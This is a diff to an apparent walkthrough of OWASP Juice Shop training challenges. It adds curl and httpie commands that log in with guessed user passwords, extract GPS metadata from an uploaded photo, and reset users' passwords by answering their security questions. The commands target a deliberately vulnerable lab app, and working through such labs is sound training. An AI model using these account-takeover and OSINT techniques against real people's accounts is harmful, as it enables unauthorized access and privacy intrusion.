@@ -83,7 +83,14 @@ TODO
 Log in with Amy's original user credentials
 
 ```bash
-TODO
+# husband: Kif Kroker
+# https://futurama.fandom.com/wiki/Amy_Wong-Kroker
+
+# The challenge description contains a few sentences which give away some information how Amy decided to strengthen her password.
+# (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")
+# https://www.grc.com/haystack.htm
+
+http http://juiceshop:3000/rest/user/login email="amy@juice-sh.op" password="K1f....................."
 ```
 
 ## Login MC SafeSearch
@@ -91,7 +98,8 @@ TODO
 Log in with MC SafeSearch's original user credentials
 
 ```bash
-TODO
+# https://www.youtube.com/watch?v=v59CX2DiX0Y
+http http://juiceshop:3000/rest/user/login email="mc.safesearch@juice-sh.op" password="Mr. N00dles"
 ```
 
 ## Meta Geo Stalking
@@ -99,15 +107,25 @@ TODO
 Determine the answer to John's security question
 
 ```bash
-TODO
+curl -sS -O http://juiceshop:3000/assets/public/images/uploads/favorite-hiking-place.png
+
+# GPS Position
+exiftool favorite-hiking-place.png
+
+# convert https://gps-coordinates.org/coordinate-converter.php
+# DMS (degrees, minutes, seconds): 36 deg 57' 31.38" N, 84 deg 20' 53.58" W
+# DD (decimal degrees): 36.95871666666667, -84.34821666666666
+# address: 1–251 Two Bridge Rd, London, KY 40744, United States
+
+# security question: What's your favorite place to go hiking?
+curl -sS http://juiceshop:3000/rest/user/reset-password \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"email":"john@juice-sh.op","answer":"Daniel Boone National Forest","new":"12345","repeat":"12345"}'
 ```
 
 ## Misplaced Signature File
 
 Access a misplaced SIEM signature file.
-```bash
-TODO
-```
 ```bash
 TODO
 ```
@@ -117,7 +135,7 @@ TODO
 Take over the wallet containing our official Soul Bound Token (NFT).
 
 ```bash
-TODO
+TODO missing
 ```
 
 ## Reset Uvogin's Password
@@ -141,5 +159,12 @@ TODO
 Determine the answer to Emma's security question
 
 ```bash
-TODO
+curl -sSO http://juiceshop:3000/assets/public/images/uploads/IMG_4253.jpg
+
+# try google upload https://images.google.com
+
+# security question: Company you first work for as an adult?
+curl -sS http://juiceshop:3000/rest/user/reset-password \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"email":"emma@juice-sh.op","answer":"ITsec","new":"12345","repeat":"12345"}'
 ```
